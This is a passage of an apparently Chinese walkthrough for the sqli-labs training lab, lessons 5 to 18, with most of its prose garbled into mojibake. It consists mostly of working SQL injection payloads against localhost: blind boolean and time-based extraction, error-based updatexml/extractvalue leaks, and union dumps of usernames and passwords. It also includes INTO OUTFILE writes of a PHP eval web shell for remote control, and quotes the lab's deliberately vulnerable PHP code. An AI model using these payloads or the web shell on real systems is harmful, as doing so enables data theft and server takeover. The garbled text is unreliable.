çˆ†åˆ—å\n?id=1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and column_name regexp \u0026#39;^username\u0026#39; limit 0,1)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from users where username regexp \u0026#39;^dumb\u0026#39; limit 1,1)-- -     like\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select schema_name from information_schema.schemata limit 0,1) like \u0026#39;i%\u0026#39;)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1) like \u0026#39;x%\u0026#39;)-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1) like \u0026#39;id%\u0026#39;)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select username from users limit 0,1) like \u0026#39;dumb%\u0026#39;)-- -     ORD() and MID()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select schema_name from information_schema.schemata limit 0,1),1,1))\u0026lt;68-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1),1,1))\u0026gt;68-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1),1,1))\u0026lt;68-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))\u0026gt;68-- -       å»¶æ—¶æ³¨å…¥\n?id=1\u0026rsquo;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(\u0026lsquo;MSG\u0026rsquo;,\u0026lsquo;by 5 seconds\u0026rsquo;)),null)),2,3 FROM (select database() as current) as tb1\u0026ndash;+\n  sleep()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),sleep(5),0)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1), 1, 1))=101),sleep(5),0)-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1), 1, 1))=105),sleep(5),0)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),sleep(5),0)-- -     benchmark()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),benchmark(5000000000000000, sha(1),0)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1), 1, 1))=101),benchmark(5000000000000000, sha(1),0)-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1), 1, 1))=105),benchmark(5000000000000000, sha(1),0)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -     ç¬›å¡å°”ç§¯(heavy query)\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) \u0026lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0, 1),1,1)) \u0026lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0, 1),1,1)) \u0026gt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -     lesson 6 çœ‹æºç \n$id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=$idLIMIT 0,1\u0026#34;; ä¸lesson 5çš„åŒºåˆ«å°±åœ¨äºè¿™é‡Œç”¨åŒå¼•å·åŒ…è£¹äº†idï¼Œæ‰€ä»¥è¦ç”¨\u0026quot;é€ƒé€¸\n?id=1\u0026#34; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- - lesson 7 çœ‹æºç ,å‘ç°æ˜¯ ')) é—­åˆ\n$sql=\u0026#34;SELECT * FROM users WHERE id=((\u0026#39;$id\u0026#39;)) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); æ ¹æ®é¢˜ç›®æç¤º \u0026ldquo;Use outfile\u0026rdquo;,æˆ‘ä»¬é€šè¿‡å†™å…¥ä¸€å¥è¯æœ¨é©¬æ¥å®ç°\nè¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ç§æ˜¯æŠŠæŸ¥è¯¢çš„æ•°æ®é€šè¿‡ into outfile å­˜æ”¾åˆ°æ–‡ä»¶å½“ä¸­ï¼Œç„¶åç›´æ¥è®¿é—®å¾—åˆ°æŸ¥è¯¢ç»“æœ\n?id=1\u0026#39;)) union select 1,2,3 into outfile \u0026#34;[absolute path]/test.txt\u0026#34; å¦ä¸€ç§æ˜¯é€šè¿‡å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶ååˆ©ç”¨èœåˆ€æˆ–è€…èšå‰‘è¿›è¡Œè¿æ¥\n?id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php@eval($_POST[\u0026#34;mima\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;[absolute path]/test.php\u0026#34; -- - lesson 8 çœ‹æºç \n$sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#39;You are in...........\u0026#39;;  //print_r(mysqli_error($con1));  //echo \u0026#34;You have an error in your SQL syntax\u0026#34;;  echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } ç”¨å•å¼•å·é—­åˆ ' ï¼Œä½†æ˜¯æŠ¥é”™è¢«æ³¨è§†æ‰äº†å› æ­¤è€ƒè™‘ä½¿ç”¨ç›²æ³¨\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 9 çœ‹æºç \n$sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; //print_r(mysqli_error($con1));  //echo \u0026#34;You have an error in your SQL syntax\u0026#34;;  echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } å‘ç°ä¸less-8åŸºæœ¬ä¸€è‡´ï¼Œå› æ­¤åŒæ ·é€‚ç”¨å»¶æ—¶ç›²æ³¨\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 10 çœ‹æºç \n$id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=$idLIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; //print_r(mysqli_error($con1));  //echo \u0026#34;You have an error in your SQL syntax\u0026#34;;  echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } è¿™é‡Œå‘ç°å¯¹äºidè¿›è¡Œå¤„ç†ï¼Œä½¿ç”¨äº†åŒå¼•å·=\u0026quot;\u0026quot;= è¿›è¡ŒåŒ…è£¹ï¼Œå› æ­¤ä¿®æ”¹ä¸€ä¸‹injection payloadå°±å¯ä»¥äº†ï¼ŒåŒæ ·ä¹Ÿæ˜¯å»¶æ—¶æ³¨å…¥\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 11 è§‚å¯Ÿæºç \n  ä¸åŒäºå‰å‡ é¢˜ï¼Œè¿™é‡Œè·å–çš„æ˜¯POSTçš„å€¼\n  uname \u0026amp; passwd çš„åœ°ä½ä¸€è‡´ï¼Œéƒ½æ²¡æœ‰è¿›è¡Œé¢å¤–çš„å¤„ç†\n  if(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { $uname=$_POST[\u0026#39;uname\u0026#39;]; $passwd=$_POST[\u0026#39;passwd\u0026#39;]; //logging the connection parameters to a file for analysis.  $fp=fopen(\u0026#39;result.txt\u0026#39;,\u0026#39;a\u0026#39;); fwrite($fp,\u0026#39;User Name:\u0026#39;.$uname); fwrite($fp,\u0026#39;Password:\u0026#39;.$passwd.\u0026#34;\\n\u0026#34;); fclose($fp); // connectivity  @$sql=\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;$uname\u0026#39; and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { //echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;;  echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 4\u0026gt;\u0026#39;; //echo \u0026#34; You Have successfully logged in\\n\\n \u0026#34; ;  echo \u0026#39;\u0026lt;font size=\u0026#34;3\u0026#34; color=\u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Login name:\u0026#39;. $row[\u0026#39;username\u0026#39;]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password:\u0026#39; .$row[\u0026#39;password\u0026#39;]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;;  print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } } åŒæ—¶ä½¿ç”¨ 1' æŸ¥çœ‹æŠ¥é”™ å¯çŸ¥éœ€è¦escape ä¸€ä¸ªå•å¼•å·\n  æ–‡ä»¶å†™å…¥  uname=1\u0026#39; union select 1,\u0026#39;\u0026lt;?php@eval($_POST[\u0026#34;mima\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;[Absoute path]/test.php\u0026#34;-- -  æŠ¥é”™æ³¨å…¥  uname=1\u0026#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -  å»¶æ—¶æ³¨å…¥  uname=-1\u0026#39; or if(substr(database(),1,1)\u0026gt;\u0026#39;a\u0026#39;, sleep(5), 1)-- -  å¸ƒå°”æ³¨å…¥  uname=-1\u0026#39; or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - lesson 12 // connectivity $uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); ä¹Ÿå¯ä»¥æ‰‹å·¥æµ‹è¯• æ­¤æ—¶ 1' æ²¡æœ‰èµ·åˆ°é—­åˆçš„ä½œç”¨ï¼Œå› æ­¤ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿ å°è¯• 1\u0026quot; ,æŠ¥é”™ï¼Œæ­¤æ—¶é—­åˆäº†ä¸€ä¸ªåŒå¼•å·ï¼Œè¿˜éœ€è¦escapeæ‹¬å·\n åŒå¼•å· (\u0026quot;\u0026quot;) åŒ…è£¹ï¼Œå…¶ä»–ä¸lesson11ä¸€è‡´ï¼Œä¸å†èµ˜è¿°\n æŠ¥é”™æ³¨å…¥  1\u0026#34;)and extractvalue(1, concat(0x7e, database(), 0x7e))-- - 1\u0026#34;)andupdatexml(1,concat(0x7e,user(),0x7e,database(),0x7e),3)-- -  å¸ƒå°”æ³¨å…¥  1\u0026#34;) or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- -  å»¶æ—¶æ³¨å…¥  1\u0026#34;) or if(substr(database(),1,1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5), 1)-- -  å¸¸è§„æ³¨å…¥  1\u0026#34;) union select 1, concat_ws(\u0026#34;:\u0026#34;, username, password) from users-- - lesson 13 çœ‹æºç \n@$sql=\u0026#34;SELECT username, password FROM users WHERE username=(\u0026#39;$uname\u0026#39;) and password=(\u0026#39;$passwd\u0026#39;) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); åŒæ ·ä¹Ÿå¯ä»¥æ‰‹å·¥æµ‹è¯•\n1' æŠ¥é”™ï¼Œ 1\u0026quot; ä¸æŠ¥é”™\n å¯ä»¥ç¡®å®šï¼Œä¸å‰é¢ä¸¤é¢˜ç±»ä¼¼ï¼Œåªæ˜¯ç”¨ ('') åŒ…è£¹ï¼ŒåŒæ—¶æŠ¥é”™è¢«æ³¨é‡Šäº†ï¼Œä¸å†èµ˜è¿°\nlesson 14 çœ‹æºç \n$uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=$unameand password=$passwdLIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); æ‰‹å·¥æµ‹è¯• 1\u0026quot; æŠ¥é”™ ç¡®è®¤ç”±=\u0026quot;\u0026quot;= åŒ…è£¹ï¼Œä¸å†èµ˜è¿°\nlesson 15 çœ‹æºç \n@$sql=\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;$uname\u0026#39; and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;;  //print_r(mysqli_error($con1));  echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } è¿™é‡Œæ³¨é‡Šæ‰äº†errorï¼Œå› æ­¤åªèƒ½ä¾é ç›²æ³¨\né¦–å…ˆæƒ³åŠæ³•é—­åˆ\n1\u0026#39; or 1=1-- - #æˆåŠŸé—­åˆ 1\u0026#34; or 1=1-- - #é—­åˆå¤±è´¥ äº†è§£æ˜¯ '' åŒ…è£¹ï¼Œæ¥ä¸‹æ¥å¼€å§‹ç›²æ³¨\n å¸ƒå°”ç›²æ³¨  -1\u0026#39; or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - -1\u0026#39;orascii(substr(database(),1,1))\u0026gt;\u0026#34;92\u0026#34;-- - 2. æŠ¥é”™ç›²æ³¨ï¼ˆæŠ¥é”™è¢«ç¦ç”¨äº†ï¼‰\n å»¶æ—¶ç›²æ³¨  -1\u0026#39;or if(left(database(),1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5),1)-- - lesson 16 çœ‹æºç \n$uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; //echo \u0026#34;Try again looser\u0026#34;;  //print_r(mysqli_error($con1));  echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } å…ˆæ‰‹å·¥æµ‹è¯•ä¸€ä¸‹=1\u0026rsquo;= 1\u0026quot; å‡æ²¡æœ‰æŠ¥é”™ï¼Œç»“åˆæºç å¾—çŸ¥æŠ¥é”™è¢«ç¦ç”¨ å°è¯•é—­åˆ\n-1\u0026#39; or 1=1-- - -1\u0026#34; or 1=1-- - -1\u0026#39;) or 1=1-- - -1\u0026#34;) or 1=1-- - #æˆåŠŸ  å¸ƒå°”ç›²æ³¨  -1\u0026#34;) or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - -1\u0026#34;)orascii(substr(database(),1,1))\u0026gt;\u0026#34;92\u0026#34;-- - 2. æŠ¥é”™ç›²æ³¨ï¼ˆæŠ¥é”™è¢«ç¦ç”¨äº†ï¼‰\n å»¶æ—¶ç›²æ³¨  -1\u0026#34;)or if(left(database(),1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5),1)-- - lesson 17 ç›´æ¥çœ‹æºç ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ï¼Œæœ‰å¯¹æ•°æ®åº“æ“ä½œçš„åœ°æ–¹å°±æœ‰å¯èƒ½ä¼šå‘ç”Ÿæ³¨å…¥ï¼Œé‚£åœ¨lesson 17å½“ä¸­ï¼Œæˆ‘ä»¬å‘ç°æœåŠ¡ç«¯è¿›è¡Œäº†ä¸¤æ¬¡æ•°æ®åº“æ“ä½œï¼Œä¸€æ¬¡SELECTï¼Œä¸€æ¬¡UPDATEï¼Œé‚£åˆ°åº•æ˜¯ä¸æ˜¯ä¸¤ä¸ªéƒ½å­˜åœ¨æ³¨å…¥å‘¢ï¼Ÿ\n$uname=check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd=$_POST[\u0026#39;passwd\u0026#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(\u0026#39;result.txt\u0026#39;,\u0026#39;a\u0026#39;); fwrite($fp,\u0026#39;User Name:\u0026#39;.$uname.\u0026#34;\\n\u0026#34;); fwrite($fp,\u0026#39;New Password:\u0026#39;.$passwd.\u0026#34;\\n\u0026#34;); fclose($fp); // connectivity @$sql=\u0026#34;SELECT username, password FROM users WHERE username= $unameLIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); //echo $row;  if($row) { //echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;;  $row1 = $row[\u0026#39;username\u0026#39;]; //echo \u0026#39;Your Login name:\u0026#39;. $row1;  $update=\u0026#34;UPDATE users SET password = \u0026#39;$passwd\u0026#39; WHERE username=\u0026#39;$row1\u0026#39;\u0026#34;; mysqli_query($con1, $update); //echo $update;  echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; ...... å¾ˆæ˜æ˜¾ä¸æ˜¯çš„ï¼Œè¿™é‡Œçš„ $uname æ— æ³•è¢«å¾ˆå¥½åœ°è¢«æˆ‘ä»¬åˆ©ç”¨ï¼ŒåŸå› æ˜¯æœåŠ¡ç«¯å¯¹ $uname è¿›è¡Œäº†è¿‡æ»¤ check_input(): é¦–å…ˆç”¨ substr() é™åˆ¶äº†å˜é‡çš„é•¿åº¦ï¼Œè®©æˆ‘ä»¬æ— æ³•æ”¾ç½®å¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥ PHPé»˜è®¤ä¼šæ‰€æœ‰çš„ GET, POST, COOKIE æ•°æ®è‡ªåŠ¨æ‰§è¡Œ addslashes() å‡½æ•°ï¼Œæ—¨åœ¨é¢„å®šä¹‰å­—ç¬¦æ·»åŠ åæ–œæ å­—ç¬¦ä¸²ï¼š\n å•å¼•å·ï¼ˆ\u0026rsquo;ï¼‰ åŒå¼•å·ï¼ˆ\u0026quot;ï¼‰ åæ–œæ ï¼ˆ\\ï¼‰ NULL  ä½†æ˜¯ä¿é™©èµ·è§ï¼Œæˆ‘ä»¬ä½¿ç”¨ get_magic_quotes_gpc() æ£€æµ‹è‡ªåŠ¨è½¬ä¹‰æ˜¯å¦å¼€å¯ï¼Œå› ä¸ºå¦‚æœå·²ç»è½¬ä¹‰è¿‡äº†ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è½¬ä¹‰å°±ä¼šå‡ºç°é—®é¢˜ã€‚ æ¥ä¸‹æ¥ï¼Œä¸ºäº†å­˜å‚¨å¾—åˆ°å®é™…çš„å€¼ï¼Œæˆ‘ä»¬ä½¿ç”¨ stripslashes() æ–¹æ³•åˆ é™¤ç”¨äºè½¬ä¹‰çš„åæ–œæ \næˆ‘ä»¬çŸ¥é“åœ¨æ•°æ®åº“ä¸­ï¼Œå­—ç¬¦ä¸²éœ€è¦ç”¨å¼•å·åŒ…è£¹ï¼Œå› æ­¤æˆ‘ä»¬ç”¨ ctype_digit() æ£€æµ‹æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œå¦‚æœä¸ºå­—ç¬¦ä¸²åˆ™å¢åŠ å¼•å·ã€‚ è¿™é‡Œçš„ mysqli_real_escape_string() æ–¹æ³•å†æ¬¡è½¬ä¹‰æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦ï¼š \\x00, \\n, \\r, \\, \u0026lsquo;, \u0026quot; and \\x1a.\nfunction check_input($con1, $value) { if(!empty($value)) { // truncation (see comments)  $value = substr($value,0,15); } // Stripslashes if magic quotes enabled  if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number  if (!ctype_digit($value)) { $value = \u0026#34;\u0026#39;\u0026#34; . mysqli_real_escape_string($con1, $value) . \u0026#34;\u0026#39;\u0026#34;; } else { $value = intval($value); } return $value; } // take the variables if(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { //making sure uname is not injectable $uname=check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); å› æ­¤æˆ‘ä»¬æ— æ³•åˆ©ç”¨ $uname ï¼Œå› ä¸ºæ‰€æœ‰ç‰¹æ®Šå­—ç¬¦éƒ½è¢«è½¬ä¹‰å¯¼è‡´æ— æ³•é€ƒé€¸ï¼Œåªèƒ½åˆ©ç”¨ UPDATE è¯­å¥ä¸­çš„ $passwd,ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å»¶æ—¶æ³¨å…¥éƒ½å¯ä»¥å®ç°ï¼Œä¸ SELECT ä¸€è‡´\nuname=admin\u0026amp;passwd=11\u0026#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- -\u0026amp;submit=Submit lesson 18 æ ¹æ®æç¤ºIP åœ°å€æœ‰æ‰€é™åˆ¶ï¼Œåˆ¤æ–­å¯èƒ½æ˜¯å¯¹äºHTTP headeræœ‰æ‰€è¦æ±‚ï¼ŒæŸ¥çœ‹æºç \n$uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); ...... $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$unameand users.password=$passwdORDER BY users.id DESC LIMIT 0,1\u0026#34;; $result1 = mysqli_query($con1, $sql); $row1 = mysqli_fetch_array($result1, MYSQLI_BOTH); if($row1) { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; $insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; mysqli_query($con1, $insert); //echo \u0026#39;Your IP ADDRESS is: \u0026#39; .$IP;  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;;  echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;\u0026#39;; echo \u0026#39;Your User Agent is: \u0026#39; .$uagent; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } ...... å¯ä»¥çœ‹åˆ°è¿™é‡Œ=$uname= $passwd éƒ½è¿›è¡Œäº† check_input() çš„è¿‡æ»¤ï¼Œå› 